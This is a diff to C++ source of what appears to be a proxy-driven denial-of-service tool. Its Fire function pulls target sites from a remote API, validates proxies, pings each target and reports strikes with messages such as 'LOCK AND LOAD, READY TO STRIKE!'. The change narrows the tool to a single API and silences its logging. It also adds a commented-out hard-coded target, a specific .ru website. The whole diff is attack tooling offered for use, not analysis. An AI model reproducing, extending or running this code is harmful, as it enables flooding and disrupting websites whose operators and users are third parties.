@@ -13,7 +13,7 @@ constexpr const size_t MAX_PROXY_ATTACKS = 5000;
 constexpr const size_t DISCOVER_TIMEOUT_SECONDS = 30;
 constexpr const size_t FIRE_TIMEOUT_SECONDS = 10;
 
-inline static void Fire(const std::vector<std::string> &apiList, std::atomic<bool> &shouldStop)
+inline static void Fire(const std::string &api, std::atomic<bool> &shouldStop)
 {
 	CURLWrapper wrapper;
 
@@ -30,7 +30,7 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 		nlohmann::json apiData;
 		while(true)
 		{
-			wrapper.SetTarget(ChoseAPI(apiList));
+			wrapper.SetTarget(api);
 			auto resp = wrapper.Download();
 			if(resp && resp->m_code >= 200 && resp->m_code < 300)
 			{
@@ -60,6 +60,7 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 			try
 			{
 				currentTarget = decodeURL(apiData["site"]["url"]);
+				//currentTarget = "https://softgrup.ru";
 			}
 			catch(...)
 			{
@@ -100,14 +101,14 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 					currentProxyAttacks = 0;
 					isProxyValid = true;
 
-					// std::cout << "Found valid proxy looking for target" << std::endl;
+					//std::cout << "Found valid proxy looking for target" << std::endl;
 					break;
 				}
 			}
 
 			if(!isProxyValid)
 			{
-				std::cerr << "No valid proxy found, trying to get others" << std::endl;
+				//std::cerr << "No valid proxy found, trying to get others" << std::endl;
 				continue;
 			}
 		}
@@ -127,18 +128,19 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 		const long targetRespCode = wrapper.Ping(DISCOVER_TIMEOUT_SECONDS);
 		if(targetRespCode >= 200 && targetRespCode < 300)
 		{
-			std::cout << "LOCK AND LOAD, READY TO STRIKE!" << std::endl;
+			//std::cout << "LOCK AND LOAD, READY TO STRIKE!" << std::endl;
+			//std::cout << "ATTACK " << currentTarget << std::endl;
 		}
 		else if(targetRespCode > 500)
 		{
-			// std::cout << "This one is dead looking for target" << std::endl;
+			std::cout << "This one is dead looking for target" << std::endl;
 			currentTarget = "";
 			continue;
 		}
 		else
 		{
 			currentTarget = "";
-			// std::cout << "Something is blocking the way, looking for target" << std::endl;
+			//std::cout << "Something is blocking the way, looking for target" << std::endl;
 			continue;
 		}
 
@@ -158,7 +160,7 @@ inline static void Fire(const std::vector<std::string> &apiList, std::atomic<boo
 			const long respCode = wrapper.Ping(20);
 			if(respCode >= 200 && respCode < 300)
 			{
-				std::cout << "Succesfuly attacked!" << std::endl;
+				//std::cout << "Succesfuly attacked!" << std::endl;
 			}
 		}
 
